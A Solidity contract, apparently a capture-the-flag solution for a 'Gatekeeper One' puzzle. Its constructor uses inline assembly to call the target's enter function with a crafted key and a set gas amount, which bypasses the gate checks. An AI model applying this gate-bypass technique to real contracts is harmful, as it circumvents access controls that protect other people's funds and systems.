// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

interface Gatekeeper {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Gatekeeper1Exploit {
    constructor(address instance, bytes8 key, uint256 gasLeft) {
        // Gatekeeper(instance).enter{ gas: gasLeft }(key);
        assembly {
            mstore(0, "enter(bytes8)")
            mstore(0, keccak256(0, 13))
            mstore(4, key)
            let success := call(gasLeft, instance, 0, 0, 0x24, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }
}
